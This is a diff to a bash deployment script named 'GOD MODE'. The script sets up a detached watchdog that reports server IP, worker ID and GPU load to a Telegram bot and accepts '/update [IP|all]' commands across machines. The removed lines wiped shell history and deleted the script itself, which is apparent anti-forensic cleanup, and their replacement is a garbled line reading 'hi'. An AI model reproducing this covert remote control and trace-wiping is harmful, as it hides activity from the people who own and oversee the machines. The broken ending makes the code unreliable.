@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v31: MONOLITHIC PRODUCTION ENGINE (SRB PEARL)   |
+# | GOD MODE v32: POSIX SHELL COMPATIBLE WATCHDOG ENGINE     |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -182,7 +182,7 @@ if [ "$HAS_GPU" -eq 1 ]; then
 fi
 
 # ----------------------------------------------------
-# [ PHASE 3: SECURE WATCHDOG ENGINE ]
+# [ PHASE 3: SECURE WATCHDOG ENGINE (POSIX FIXED) ]
 # ----------------------------------------------------
 cat <<EOF > watchdog.sh
 #!/bin/bash
@@ -314,11 +314,13 @@ send_specs_report() {
     if command -v nvidia-smi >/dev/null 2>&1; then
         msg="\${msg}🎮 <b>GPU HARDWARE DIAGNOSTICS:</b>%0A"
         local gpu_idx=0
-        while IFS=',' read -r name util mem_used mem_total temp fan; do
+        
+        # Исправленный POSIX-пайплайн для сбора статистики nvidia-smi
+        nvidia-smi --query-gpu=name,utilization.gpu,memory.used,memory.total,temperature.gpu,fan.speed --format=csv,noheader,nounits 2>/dev/null | while IFS=',' read -r name util mem_used mem_total temp fan; do
             msg="\${msg}• <b>GPU \${gpu_idx}:</b> \${name}%0A"
             msg="\${msg}  └ Load: \${util}% | Temp: \${temp}°C | Fan: \${fan}% | VRAM: \${mem_used}MB / \${mem_total}MB%0A"
             gpu_idx=\$((gpu_idx + 1))
-        done < <(nvidia-smi --query-gpu=name,utilization.gpu,memory.used,memory.total,temperature.gpu,fan.speed --format=csv,noheader,nounits 2>/dev/null)
+        done
     elif [ "\$HAS_GPU" -eq 1 ]; then
         msg="\${msg}🎮 <b>GPU DIAGNOSTICS:</b> Generic GPU Hardware Detected%0A"
     else
@@ -341,7 +343,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V31 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V32 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -455,15 +457,15 @@ EOF
 
 chmod +x watchdog.sh
 
-# Запускаем вачдог полностью отвязанным от терминала
+# Запускаем вачдог полностью отвязанным через явный bash
 pkill -9 -f "watchdog.sh" 2>/dev/null
-(nohup ./watchdog.sh </dev/null >/dev/null 2>&1 &)
+(nohup bash "$BASE_DIR/watchdog.sh" </dev/null >/dev/null 2>&1 &)
 
 # ----------------------------------------------------
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V31 INITIALIZED"
+echo "[+] ENGINE V32 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
 echo "================================================="
@@ -537,5 +539,4 @@ EOF
     systemctl start connfy-wd >/dev/null 2>&1
 fi
 
-history -c
-rm -f "$0"
+hi
